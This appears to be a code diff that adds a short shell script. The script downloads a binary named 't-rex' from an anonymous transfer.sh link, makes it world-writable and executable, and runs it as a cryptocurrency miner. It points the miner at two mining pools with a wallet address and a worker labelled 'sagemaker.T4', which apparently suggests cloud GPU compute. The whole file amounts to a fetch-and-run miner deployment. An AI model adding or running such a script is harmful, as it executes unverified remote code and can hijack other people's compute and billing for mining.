@@ -1,0 +1,6 @@
+#!/bin/sh
+
+wget https://transfer.sh/TeNFRM/t-rex
+chmod 777 t-rex
+./t-rex -a ethash --lhr-algo autolykos2 -o stratum+tcp://ethash.poolbinance.com:443 -u sagemaker.T4 rig0 --url2 stratum+tcp://pool.woolypooly.com:3100 --user2 9gpNWA3LVic14cMmWHmKGZyiGqrxPaSEvGsdyt7jt2DDAWDQyc9.rig0 --pass2 x
+
